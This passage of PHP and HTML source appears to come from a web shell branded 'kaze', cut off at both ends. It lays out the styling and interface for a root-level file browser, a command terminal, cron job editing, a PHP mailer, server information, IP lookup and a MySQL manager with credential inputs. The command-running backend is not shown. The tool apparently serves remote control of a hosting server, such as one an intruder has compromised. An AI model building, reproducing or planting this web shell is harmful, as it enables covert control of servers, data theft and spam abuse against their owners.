.iform.on{display:flex}
.iform input[type=text],.iform input[type=file]{background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:7px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;transition:border .18s;flex:1}
.iform input:focus{border-color:var(--a1)}
.iform .go{background:var(--a1);color:#fff;border:none;border-radius:6px;padding:7px 15px;font-family:var(--sans);font-size:12px;font-weight:600;cursor:pointer;transition:opacity .15s;white-space:nowrap}
.iform .go:hover{opacity:.85}
.iform .lbl{color:var(--txt2);font-size:13px;flex-shrink:0}

/* FILTER BAR */
.fbar{display:flex;align-items:center;gap:7px;background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:8px 13px;margin-bottom:11px;flex-wrap:wrap}
.fl-lbl{font-size:10px;color:var(--txt3);letter-spacing:1px;text-transform:uppercase;font-family:var(--mono);margin-right:2px;flex-shrink:0}
.chip{display:inline-flex;align-items:center;gap:5px;padding:4px 11px;border-radius:20px;border:1px solid var(--line2);background:transparent;color:var(--txt2);font-family:var(--mono);font-size:11px;cursor:pointer;transition:all .15s;flex-shrink:0}
.chip:hover{border-color:var(--a1);color:var(--a1)}
.chip.on{background:rgba(124,109,250,.12);border-color:var(--a1);color:var(--a1)}
.chip i{font-size:10px}
.fl-sep{width:1px;height:16px;background:var(--line);margin:0 3px;flex-shrink:0}
.livesrch{display:flex;align-items:center;gap:7px;background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:5px 10px;margin-left:auto}
.livesrch input{background:none;border:none;color:var(--txt);font-family:var(--mono);font-size:11px;outline:none;width:130px}
.livesrch input::placeholder{color:var(--txt3)}
.livesrch i{color:var(--txt3);font-size:11px;flex-shrink:0}

/* STATS */
.stats{display:flex;gap:16px;align-items:center;font-size:11px;color:var(--txt3);margin-bottom:10px;flex-wrap:wrap}
.stats span{display:flex;align-items:center;gap:4px}
.stats i{font-size:10px}
.stats .pd{margin-left:auto;font-family:var(--mono);font-size:10px;max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* TABLE */
.tbl-wrap{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;box-shadow:var(--shadow)}
.ftable{width:100%;border-collapse:collapse}
.ftable th{background:var(--card2);padding:10px 14px;text-align:left;color:var(--txt3);font-size:10px;letter-spacing:1.8px;text-transform:uppercase;border-bottom:1px solid var(--line);font-family:var(--sans);font-weight:600;white-space:nowrap}
.ftable td{padding:9px 14px;border-bottom:1px solid var(--line);vertical-align:middle;transition:background .12s}
.ftable tr:last-child td{border-bottom:none}
.ftable tbody tr:hover td{background:rgba(255,255,255,.022)}
.ftable tr.hr{display:none}

.ftable th.chk,.ftable td.chk{width:34px;padding:9px 6px 9px 14px}
input[type=checkbox]{accent-color:var(--a1);width:14px;height:14px;cursor:pointer}

.nm{display:flex;align-items:center;gap:9px}
.nm .ico{font-size:16px;flex-shrink:0;width:20px;text-align:center}
.nm a{color:var(--a4);text-decoration:none;font-weight:500;font-size:13px;transition:color .15s}
.nm a:hover{color:#fff}
.nm .fn{color:var(--txt);font-size:13px}

.badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:600;letter-spacing:.4px;text-transform:uppercase;font-family:var(--mono)}
.bd{background:rgba(255,196,109,.1);color:var(--a4);border:1px solid rgba(255,196,109,.2)}
.bf{background:rgba(136,150,179,.1);color:var(--txt3);border:1px solid rgba(136,150,179,.15)}

.sz{color:var(--txt3);font-family:var(--mono);font-size:11px;white-space:nowrap}
.tm-cell{color:var(--txt3);font-family:var(--mono);font-size:11px;white-space:nowrap}
.tm-cell span{cursor:pointer;transition:color .15s}
.tm-cell span:hover{color:var(--txt)}
.pm-cell{font-family:var(--mono);font-size:11px;white-space:nowrap}
.pm-cell span{color:var(--a2);cursor:pointer;transition:color .15s}
.pm-cell span:hover{color:var(--a1)}

.acts{display:flex;gap:2px}
.ab{display:inline-flex;align-items:center;justify-content:center;width:27px;height:27px;border-radius:6px;border:1px solid transparent;color:var(--txt3);text-decoration:none;font-size:11px;transition:all .15s;cursor:pointer;background:none;flex-shrink:0}
.ab:hover{color:var(--txt);border-color:var(--line2);background:var(--card2)}
.ab.v:hover{color:var(--a2);border-color:rgba(79,200,255,.3)}
.ab.e:hover{color:var(--a5);border-color:rgba(87,229,158,.3)}
.ab.rn:hover{color:var(--a1);border-color:rgba(124,109,250,.3)}
.ab.cp:hover{color:var(--a4);border-color:rgba(255,196,109,.3)}
.ab.dw:hover{color:var(--a5);border-color:rgba(87,229,158,.3)}
.ab.dl:hover{color:var(--a3);border-color:rgba(250,109,138,.3)}

.back-row td{padding:8px 14px;border-bottom:1px solid var(--line)}
.blnk{display:inline-flex;align-items:center;gap:7px;color:var(--txt3);text-decoration:none;font-size:12px;font-family:var(--mono);transition:color .15s}
.blnk:hover{color:var(--txt)}

/* BULK BAR */
.bulk-bar{display:none;align-items:center;gap:10px;background:rgba(124,109,250,.08);border:1px solid rgba(124,109,250,.25);border-radius:var(--r);padding:9px 14px;margin-bottom:11px;flex-wrap:wrap}
.bulk-bar.on{display:flex;animation:fadeIn .18s ease}
.bulk-cnt{font-size:12px;color:var(--a1);font-family:var(--mono);font-weight:500}

/* PANELS */
.panel{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;margin-bottom:14px;animation:fadeIn .2s ease;box-shadow:var(--shadow)}
.phdr{display:flex;align-items:center;justify-content:space-between;padding:11px 16px;background:var(--card2);border-bottom:1px solid var(--line)}
.ptitle{font-size:13.5px;font-weight:600;display:flex;align-items:center;gap:8px}
.ptitle i{color:var(--a1)}
.panel pre{padding:16px;font-size:11.5px;line-height:1.75;color:var(--txt);overflow:auto;max-height:500px;white-space:pre-wrap;word-break:break-all;font-family:var(--mono);background:var(--bg2)}
.panel textarea{width:100%;background:var(--bg2);border:none;color:var(--txt);font-family:var(--mono);font-size:12px;line-height:1.75;padding:16px;resize:vertical;min-height:300px;outline:none;display:block}
.pftr{padding:11px 16px;border-top:1px solid var(--line);display:flex;gap:8px}
.ren-form{padding:16px;display:flex;gap:10px;align-items:center}
.ren-form input{flex:1;background:var(--bg2);border:1px solid var(--line2);border-radius:7px;padding:9px 12px;color:var(--txt);font-family:var(--mono);font-size:13px;outline:none;transition:border .18s}
.ren-form input:focus{border-color:var(--a1)}
.cm-form{padding:16px;display:flex;flex-direction:column;gap:10px}
.cm-form label{font-size:11px;color:var(--txt3);font-family:var(--mono);letter-spacing:.5px;text-transform:uppercase;margin-bottom:2px;display:block}
.cm-form input{background:var(--bg2);border:1px solid var(--line2);border-radius:7px;padding:9px 12px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;transition:border .18s;width:100%}
.cm-form input:focus{border-color:var(--a1)}

/* CHMOD */
.chmod-form{padding:16px;display:flex;flex-direction:column;gap:12px}
.chmod-bits{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.chmod-col{background:var(--bg2);border:1px solid var(--line);border-radius:8px;padding:10px;text-align:center}
.chmod-col-title{font-size:10px;color:var(--txt3);letter-spacing:1px;text-transform:uppercase;font-family:var(--mono);margin-bottom:8px}
.chmod-row{display:flex;justify-content:center;align-items:center;gap:6px;margin-bottom:5px;font-size:11px;color:var(--txt2);font-family:var(--mono)}
#chmod-preview{font-family:var(--mono);font-size:20px;color:var(--a2);text-align:center;padding:10px;background:var(--bg2);border-radius:6px;letter-spacing:2px}

/* TERMINAL */
.term-wrap{display:none;background:#050609;border:1px solid var(--line2);border-radius:var(--r);overflow:hidden;margin-bottom:14px;box-shadow:var(--shadow);animation:fadeIn .2s ease}
.term-wrap.on{display:block}
.term-hdr{display:flex;align-items:center;justify-content:space-between;padding:9px 14px;background:#08090e;border-bottom:1px solid var(--line)}
.dots{display:flex;gap:6px}
.dot{width:11px;height:11px;border-radius:50%}
.dr{background:#ff5f57}.dy{background:#febc2e}.dg{background:#28c840}
.term-ttl{font-size:11px;color:var(--txt3);letter-spacing:.5px;font-family:var(--mono)}
.term-x{background:none;border:none;color:var(--txt3);cursor:pointer;font-size:12px;transition:color .15s;padding:2px}
.term-x:hover{color:var(--a3)}
#tbox{background:#050609;color:#5fffbe;padding:12px 16px;height:280px;overflow-y:auto;font-family:var(--mono);font-size:12px;line-height:1.75}
.ti-row{display:flex;align-items:center;padding:9px 14px;border-top:1px solid var(--line);gap:7px;background:#07080d}
.tprompt{color:var(--a1);font-size:12px;user-select:none;font-family:var(--mono)}
#tinput{flex:1;background:transparent;border:none;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;caret-color:var(--a1)}

/* TOAST */
#toast{position:fixed;bottom:24px;right:24px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
.ti{display:flex;align-items:center;gap:10px;padding:11px 16px;border-radius:10px;background:var(--card2);border:1px solid var(--line2);box-shadow:var(--shadow);font-size:13px;pointer-events:all;min-width:200px;max-width:320px;animation:slideUp .28s ease}
.ti.ok{border-left:3px solid var(--a5)}.ti.err{border-left:3px solid var(--a3)}
.ti .tic{font-size:14px;flex-shrink:0}.ti .tic.ok{color:var(--a5)}.ti .tic.err{color:var(--a3)}
.ti .tim{color:var(--txt);font-size:13px;flex:1}

@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes slideUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}

::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--line2);border-radius:4px}

/* ── MODAL POPUP ─────────────────────────────────────── */
.modal-overlay{
  display:none;position:fixed;inset:0;z-index:8000;
  background:rgba(0,0,0,.75);backdrop-filter:blur(6px);
  align-items:center;justify-content:center;padding:20px;
}
.modal-overlay.open{display:flex;animation:fadeIn .18s ease}
.modal-box{
  background:var(--card);border:1px solid var(--line2);
  border-radius:16px;width:100%;max-width:820px;
  max-height:90vh;display:flex;flex-direction:column;
  box-shadow:0 24px 80px rgba(0,0,0,.7);
  animation:popIn .22s cubic-bezier(.34,1.56,.64,1);
  overflow:hidden;
}
.modal-box.wide{max-width:1080px}
.modal-hdr{
  display:flex;align-items:center;justify-content:space-between;
  padding:14px 20px;background:var(--card2);border-bottom:1px solid var(--line);
  flex-shrink:0;
}
.modal-title{font-weight:600;font-size:14px;display:flex;align-items:center;gap:9px}
.modal-close{
  background:none;border:none;color:var(--txt3);cursor:pointer;
  font-size:16px;padding:4px 8px;border-radius:6px;transition:all .15s;
  display:flex;align-items:center;justify-content:center;
}
.modal-close:hover{color:var(--a3);background:rgba(250,109,138,.1)}
.modal-body{flex:1;overflow-y:auto;padding:20px}
.modal-body::-webkit-scrollbar{width:4px}
.modal-body::-webkit-scrollbar-thumb{background:var(--line2);border-radius:4px}
@keyframes popIn{from{opacity:0;transform:scale(.93) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}

@media(max-width:700px){
  .ftable th:nth-child(5),.ftable td:nth-child(5),
  .ftable th:nth-child(6),.ftable td:nth-child(6),
  .ftable th:nth-child(7),.ftable td:nth-child(7){display:none}
  .stats .pd{display:none}
}
</style>
</head>
<body>
<div id="toast"></div>

<!-- MODALS -->
<div class="modal-overlay" id="mo-hash"><div class="modal-box"><div class="modal-hdr"><div class="modal-title"><i class="fas fa-hashtag" style="color:var(--a5)"></i> Hash Checker</div><button class="modal-close" onclick="closeModal('mo-hash')"><i class="fas fa-xmark"></i></button></div><div class="modal-body" id="mb-hash"></div></div></div>
<div class="modal-overlay" id="mo-ipinfo"><div class="modal-box"><div class="modal-hdr"><div class="modal-title"><i class="fas fa-globe" style="color:var(--a3)"></i> IP Info</div><button class="modal-close" onclick="closeModal('mo-ipinfo')"><i class="fas fa-xmark"></i></button></div><div class="modal-body" id="mb-ipinfo"></div></div></div>
<div class="modal-overlay" id="mo-mysql"><div class="modal-box wide"><div class="modal-hdr"><div class="modal-title"><i class="fas fa-database" style="color:#a5b4fc"></i> MySQL Manager</div><button class="modal-close" onclick="closeModal('mo-mysql')"><i class="fas fa-xmark"></i></button></div><div class="modal-body" id="mb-mysql"></div></div></div>
<div class="modal-overlay" id="mo-mailer"><div class="modal-box"><div class="modal-hdr"><div class="modal-title"><i class="fas fa-envelope" style="color:var(--a2)"></i> PHP Mailer</div><button class="modal-close" onclick="closeModal('mo-mailer')"><i class="fas fa-xmark"></i></button></div><div class="modal-body" id="mb-mailer"></div></div></div>
<div class="modal-overlay" id="mo-zip"><div class="modal-box"><div class="modal-hdr"><div class="modal-title"><i class="fas fa-file-zipper" style="color:var(--a4)"></i> Zip / Unzip</div><button class="modal-close" onclick="closeModal('mo-zip')"><i class="fas fa-xmark"></i></button></div><div class="modal-body" id="mb-zip"></div></div></div>
<div class="modal-overlay" id="mo-sinfo"><div class="modal-box"><div class="modal-hdr"><div class="modal-title"><i class="fas fa-server" style="color:var(--a5)"></i> Server Info</div><button class="modal-close" onclick="closeModal('mo-sinfo')"><i class="fas fa-xmark"></i></button></div><div class="modal-body" id="mb-sinfo"></div></div></div>
<div class="modal-overlay" id="mo-cron"><div class="modal-box"><div class="modal-hdr"><div class="modal-title"><i class="fas fa-clock" style="color:var(--a1)"></i> Cron Jobs</div><button class="modal-close" onclick="closeModal('mo-cron')"><i class="fas fa-xmark"></i></button></div><div class="modal-body" id="mb-cron"></div></div></div>

<!-- Terminal Modal -->
<div class="modal-overlay" id="mo-term">
  <div class="modal-box wide" style="max-width:900px;height:85vh">
    <div class="modal-hdr">
      <div class="modal-title">
        <div style="display:flex;gap:6px"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
        <span style="font-family:var(--mono);font-size:12px;color:var(--txt3)" id="term-modal-cwd"><?=safe($path)?></span>
      </div>
      <button class="modal-close" onclick="closeModal('mo-term')"><i class="fas fa-xmark"></i></button>
    </div>
    <div style="flex:1;display:flex;flex-direction:column;overflow:hidden;background:#050609">
      <div id="tbox" style="flex:1;overflow-y:auto;padding:14px 18px;font-family:var(--mono);font-size:12px;line-height:1.75;color:#5fffbe;background:#050609">
        <span style="color:var(--txt3)">Terminal ready. Type 'help' for commands.<br></span>
      </div>
      <div style="display:flex;align-items:center;padding:10px 16px;border-top:1px solid var(--line);gap:7px;background:#07080d;flex-shrink:0">
        <span class="tprompt" style="color:var(--a1);font-size:12px;user-select:none;font-family:var(--mono)">❯</span>
        <input id="tinput" type="text" placeholder="command…" autocomplete="off" spellcheck="false"
          style="flex:1;background:transparent;border:none;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;caret-color:var(--a1)">
      </div>
    </div>
  </div>
</div>

<div class="shell">

<!-- HEADER -->
<div class="header">
  <div class="logo">
    <svg width="160" height="52" viewBox="0 0 160 52" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="xg1" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#00e5ff"/>
          <stop offset="100%" stop-color="#00b8d4"/>
        </linearGradient>
        <linearGradient id="xg2" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#b388ff"/>
          <stop offset="100%" stop-color="#9c6fff"/>
        </linearGradient>
        <linearGradient id="xg3" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#ff4da6"/>
          <stop offset="100%" stop-color="#e040fb"/>
        </linearGradient>
        <filter id="xglow" x="-20%" y="-20%" width="140%" height="140%">
          <feGaussianBlur stdDeviation="2" result="blur"/>
          <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
        </filter>
      </defs>

      <!-- X big cyan - back layer (offset/shadow effect) -->
      <line x1="4" y1="5" x2="36" y2="47" stroke="#00e5ff" stroke-width="9" stroke-linecap="round" opacity="0.18"/>
      <line x1="36" y1="5" x2="4" y2="47" stroke="#00e5ff" stroke-width="9" stroke-linecap="round" opacity="0.18"/>

      <!-- X detail lines (cyberpunk cuts) -->
      <line x1="8" y1="5" x2="14" y2="14" stroke="#00e5ff" stroke-width="2" stroke-linecap="round" opacity="0.6"/>
      <line x1="26" y1="38" x2="32" y2="47" stroke="#00e5ff" stroke-width="2" stroke-linecap="round" opacity="0.6"/>
      <line x1="32" y1="5" x2="26" y2="14" stroke="#00e5ff" stroke-width="2" stroke-linecap="round" opacity="0.6"/>
      <line x1="14" y1="38" x2="8" y2="47" stroke="#00e5ff" stroke-width="2" stroke-linecap="round" opacity="0.6"/>

      <!-- X main cyan -->
      <line x1="5" y1="6" x2="35" y2="46" stroke="url(#xg1)" stroke-width="6" stroke-linecap="round" filter="url(#xglow)"/>
      <line x1="35" y1="6" x2="5" y2="46" stroke="url(#xg1)" stroke-width="6" stroke-linecap="round" filter="url(#xglow)"/>

      <!-- pink chevron inside X -->
      <polyline points="14,14 20,26 14,38" fill="none" stroke="url(#xg3)" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>

      <!-- small cyberpunk detail squares -->
      <rect x="37" y="6" width="3" height="3" fill="#00e5ff" opacity="0.7"/>
      <rect x="2" y="22" width="2" height="2" fill="#ff4da6" opacity="0.6"/>
      <rect x="33" y="43" width="2.5" height="2.5" fill="#00e5ff" opacity="0.5"/>

      <!-- diagonal accent lines top right -->
      <line x1="42" y1="4" x2="54" y2="12" stroke="#00e5ff" stroke-width="1.2" stroke-linecap="round" opacity="0.5"/>
      <line x1="45" y1="2" x2="52" y2="8" stroke="#00e5ff" stroke-width="0.8" stroke-linecap="round" opacity="0.3"/>

      <!-- "kaze" text purple -->
      <text x="52" y="34" font-family="Arial,sans-serif" font-size="28" font-weight="700"
            fill="url(#xg2)" letter-spacing="-0.5">kaze</text>

      <!-- circle/target on 'a' -->
      <circle cx="78" cy="27" r="7" fill="none" stroke="#9c6fff" stroke-width="1.2" opacity="0.6"/>
      <circle cx="78" cy="27" r="4" fill="none" stroke="#b388ff" stroke-width="0.8" opacity="0.4"/>

      <!-- bottom accent line -->
      <line x1="52" y1="40" x2="148" y2="40" stroke="url(#xg2)" stroke-width="0.8" opacity="0.35"/>
      <rect x="145" y="38" width="4" height="4" fill="none" stroke="#b388ff" stroke-width="1" opacity="0.5"/>
    </svg>
  </div>
  <div class="swrap" id="swrap">
    <i class="fas fa-magnifying-glass si"></i>
    <input id="sinput" type="text" placeholder="Search files recursively…" autocomplete="off" spellcheck="false">
    <span class="sbadge" id="sbadge">recursive</span>
    <button id="sclear" onclick="clearS()"><i class="fas fa-xmark"></i></button>
    <div id="sresults"></div>
  </div>
  <div class="hdr-right">
    <button class="btn btn-term" onclick="openModal('mo-term');setTimeout(()=>document.getElementById('tinput').focus(),200)"><i class="fas fa-terminal"></i> Terminal</button>
  </div>
</div>

<!-- Terminal is now a popup modal -->

<!-- BREADCRUMB — full clickable path -->
<div class="bc">
  <span class="bc-pre">path</span>
  <?php
  // Tampilkan setiap segment path sebagai link
  $acc = '';
  $total = count($bcSegments);
  // Root /
  echo '<a href="?path='.urlencode('/').'" class="bc-seg" onclick="event.preventDefault();navTo('/')">/</a>';
  foreach($bcSegments as $idx => $seg):
      $acc .= '/' . $seg;
      $isLast = ($idx === $total - 1);
      echo '<span class="bc-sep"><i class="fas fa-chevron-right" style="font-size:8px"></i></span>';
      if($isLast):
          echo '<span class="bc-seg cur">'.safe($seg).'</span>';
      else:
          $accJs = addslashes($acc);
          echo '<a href="?path='.urlencode($acc).'" class="bc-seg" onclick="event.preventDefault();navTo(\''.$accJs.'\')">'.safe($seg).'</a>';
      endif;
  endforeach;
  ?>
</div>

<!-- TOOLBAR -->
<div class="toolbar">
  <button class="btn" onclick="tog('ff')"><i class="fas fa-folder-plus"></i> New Folder</button>
  <button class="btn" onclick="tog('nf')"><i class="fas fa-file-circle-plus"></i> New File</button>
  <button class="btn" onclick="tog('uf')"><i class="fas fa-cloud-upload-alt"></i> Upload</button>
  <button class="btn btn-term"  onclick="openModal('mo-cron')"><i class="fas fa-clock"></i> Cron Jobs</button>
  <button class="btn" onclick="openModal('mo-sinfo')"  style="border-color:rgba(87,229,158,.35);color:var(--a5)"><i class="fas fa-server"></i> Server Info</button>
  <button class="btn" onclick="openModal('mo-mailer')" style="border-color:rgba(79,200,255,.35);color:var(--a2)"><i class="fas fa-envelope"></i> Mailer</button>
  <button class="btn" onclick="openModal('mo-zip')"    style="border-color:rgba(255,196,109,.35);color:var(--a4)"><i class="fas fa-file-zipper"></i> Zip/Unzip</button>
  <button class="btn" onclick="openModal('mo-hash')"   style="border-color:rgba(87,229,158,.35);color:var(--a5)"><i class="fas fa-hashtag"></i> Hash</button>
  <button class="btn" onclick="openModal('mo-ipinfo')" style="border-color:rgba(250,109,138,.35);color:var(--a3)"><i class="fas fa-globe"></i> IP Info</button>
  <button class="btn" onclick="openModal('mo-mysql')"  style="border-color:rgba(165,180,252,.35);color:#a5b4fc"><i class="fas fa-database"></i> MySQL</button>
</div>

<form method="POST"><div class="iform" id="ff">
  <span class="lbl"><i class="fas fa-folder" style="color:var(--a4)"></i></span>
  <input type="text" name="newfolder" placeholder="folder name">
  <button type="submit" class="go"><i class="fas fa-check"></i> Create</button>
</div></form>

<form method="POST"><div class="iform" id="nf">
  <span class="lbl"><i class="fas fa-file" style="color:var(--a2)"></i></span>
  <input type="text" name="newfile" placeholder="file name">
  <button type="submit" class="go"><i class="fas fa-check"></i> Create</button>
</div></form>

<form method="POST" enctype="multipart/form-data"><div class="iform" id="uf">
  <span class="lbl"><i class="fas fa-cloud-upload-alt" style="color:var(--a1)"></i></span>
  <input type="file" name="upfile" multiple>
  <button type="submit" class="go"><i class="fas fa-upload"></i> Upload</button>
</div></form>

<!-- HASH CHECKER PANEL -->
<style>
.hash-row{display:flex;align-items:center;gap:10px;padding:8px 12px;background:var(--bg2);border:1px solid var(--line);border-radius:7px;margin-bottom:7px}
.hash-label{font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase;width:56px;flex-shrink:0}
.hash-val{font-family:var(--mono);font-size:11px;color:var(--a5);flex:1;word-break:break-all;cursor:pointer}
.hash-val:hover{color:#fff}
.hash-copy{background:none;border:none;color:var(--txt3);cursor:pointer;font-size:11px;flex-shrink:0;padding:2px 5px;transition:color .15s}
.hash-copy:hover{color:var(--a5)}
</style>
<div class="iform" id="hash-panel" style="flex-direction:column;align-items:stretch;gap:14px;padding:16px">
  <span style="font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px">
    <i class="fas fa-hashtag" style="color:var(--a5)"></i> Hash Checker
  </span>
  <div style="display:flex;gap:8px">
    <input id="hash-input" type="text" value="<?=safe($path)?>" placeholder="/path/to/file"
      style="background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;flex:1;transition:border .18s">
    <button class="btn btn-primary" onclick="doHash()"><i class="fas fa-magnifying-glass"></i> Check</button>
  </div>
  <div id="hash-result" style="display:none;flex-direction:column;gap:0">
    <div style="font-size:11px;color:var(--txt2);font-family:var(--mono);margin-bottom:10px" id="hash-meta"></div>
    <div class="hash-row"><span class="hash-label">MD5</span><span class="hash-val" id="h-md5" onclick="copyText(this)"></span><button class="hash-copy" onclick="copyText(document.getElementById('h-md5'))"><i class="fas fa-copy"></i></button></div>
    <div class="hash-row"><span class="hash-label">SHA1</span><span class="hash-val" id="h-sha1" onclick="copyText(this)"></span><button class="hash-copy" onclick="copyText(document.getElementById('h-sha1'))"><i class="fas fa-copy"></i></button></div>
    <div class="hash-row"><span class="hash-label">SHA256</span><span class="hash-val" id="h-sha256" onclick="copyText(this)"></span><button class="hash-copy" onclick="copyText(document.getElementById('h-sha256'))"><i class="fas fa-copy"></i></button></div>
    <div class="hash-row"><span class="hash-label">SHA512</span><span class="hash-val" id="h-sha512" onclick="copyText(this)"></span><button class="hash-copy" onclick="copyText(document.getElementById('h-sha512'))"><i class="fas fa-copy"></i></button></div>
    <div class="hash-row"><span class="hash-label">MIME</span><span class="hash-val" id="h-mime" style="color:var(--a2)"></span></div>
  </div>
  <div id="hash-err" style="display:none;color:var(--a3);font-size:12px;font-family:var(--mono)"></div>
</div>

<!-- IP INFO PANEL -->
<div class="iform" id="ipinfo-panel" style="flex-direction:column;align-items:stretch;gap:14px;padding:16px">
  <span style="font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px">
    <i class="fas fa-globe" style="color:var(--a3)"></i> IP Info / Geolocation
  </span>
  <div style="display:flex;gap:8px">
    <input id="ip-input" type="text" placeholder="IP address or domain (empty = your IP)"
      style="background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;flex:1;transition:border .18s">
    <button class="btn btn-primary" onclick="doIpInfo()"><i class="fas fa-magnifying-glass"></i> Lookup</button>
    <button class="btn" onclick="document.getElementById('ip-input').value='';doIpInfo()"><i class="fas fa-server"></i> My IP</button>
  </div>
  <div id="ip-result" style="display:none">
    <table style="width:100%;border-collapse:collapse;font-size:12px">
      <?php foreach([
        ['ip-r-ip','IP Address',''],
        ['ip-r-country','Country',''],
        ['ip-r-region','Region',''],
        ['ip-r-city','City',''],
        ['ip-r-zip','ZIP',''],
        ['ip-r-coords','Coordinates',''],
        ['ip-r-tz','Timezone',''],
        ['ip-r-isp','ISP',''],
        ['ip-r-org','Organization',''],
        ['ip-r-as','AS',''],
      ] as [$id,$label,$_]): ?>
      <tr style="border-bottom:1px solid var(--line)">
        <td style="padding:8px 12px;color:var(--txt3);font-family:var(--mono);font-size:10px;text-transform:uppercase;letter-spacing:1px;width:130px"><?=$label?></td>
        <td style="padding:8px 12px;color:var(--txt);font-family:var(--mono);font-size:12px" id="<?=$id?>">—</td>
      </tr>
      <?php endforeach; ?>
    </table>
  </div>
  <div id="ip-err" style="display:none;color:var(--a3);font-size:12px;font-family:var(--mono)"></div>
</div>

<!-- MYSQL MANAGER PANEL -->
<style>
.mysql-tabs{display:flex;gap:0;border-bottom:1px solid var(--line);margin-bottom:14px}
.mysql-tab{padding:8px 14px;font-size:12px;font-family:var(--mono);color:var(--txt3);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;background:none;border-top:none;border-left:none;border-right:none;white-space:nowrap}
.mysql-tab:hover{color:var(--txt)}
.mysql-tab.on{color:#a5b4fc;border-bottom-color:#a5b4fc}
.mysql-section{display:none}.mysql-section.on{display:block}
.dbrow{display:flex;flex-direction:column;gap:4px;margin-bottom:10px}
.dbrow label{font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase}
.dbrow input,.dbrow select{background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;transition:border .18s;width:100%}
.dbrow input:focus,.dbrow select:focus{border-color:#a5b4fc}
.db-tbl{width:100%;border-collapse:collapse;font-size:11px}
.db-tbl th{background:var(--card2);padding:7px 10px;text-align:left;color:var(--txt3);font-size:10px;letter-spacing:1px;text-transform:uppercase;border-bottom:1px solid var(--line);white-space:nowrap}
.db-tbl td{padding:7px 10px;border-bottom:1px solid var(--line);color:var(--txt);font-family:var(--mono);font-size:11px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.db-tbl tr:hover td{background:rgba(255,255,255,.02)}
.db-list-item{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:var(--bg2);border:1px solid var(--line);border-radius:7px;margin-bottom:5px;cursor:pointer;transition:all .15s;font-family:var(--mono);font-size:12px}
.db-list-item:hover{border-color:#a5b4fc;color:#a5b4fc}
</style>
<div class="iform" id="mysql-panel" style="flex-direction:column;align-items:stretch;gap:0;padding:16px">
  <div style="display:flex;align-items:center;margin-bottom:14px">
    <span style="font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px">
      <i class="fas fa-database" style="color:#a5b4fc"></i> MySQL Manager
    </span>
  </div>

  <!-- Connection -->
  <div style="background:var(--bg2);border:1px solid var(--line);border-radius:8px;padding:12px;margin-bottom:14px">
    <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase;margin-bottom:10px">Connection</div>
    <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr auto;gap:8px;align-items:end">
      <div class="dbrow" style="margin:0"><label>Host</label><input type="text" id="db-host" value="localhost" placeholder="localhost"></div>
      <div class="dbrow" style="margin:0"><label>User</label><input type="text" id="db-user" placeholder="root"></div>
      <div class="dbrow" style="margin:0"><label>Password</label><input type="password" id="db-pass" placeholder="password"></div>
      <div class="dbrow" style="margin:0"><label>Database</label><input type="text" id="db-name" placeholder="optional"></div>
      <button class="btn btn-primary" onclick="dbConnect()" style="white-space:nowrap;height:36px"><i class="fas fa-plug"></i> Connect</button>
    </div>
    <div id="db-status" style="margin-top:8px;font-size:11px;font-family:var(--mono);display:none"></div>
  </div>

  <div id="db-workspace" style="display:none">
    <div class="mysql-tabs">
      <button type="button" class="mysql-tab on" onclick="mysqlTab(this,'mt-dbs')"><i class="fas fa-database"></i> Databases</button>
      <button type="button" class="mysql-tab"    onclick="mysqlTab(this,'mt-query')"><i class="fas fa-terminal"></i> Query</button>
      <button type="button" class="mysql-tab"    onclick="mysqlTab(this,'mt-browse')"><i class="fas fa-table"></i> Browse</button>
    </div>

    <!-- Databases & Tables -->
    <div class="mysql-section on" id="mt-dbs">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
        <div>
          <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">Databases</div>
          <div id="db-list"></div>
        </div>
        <div>
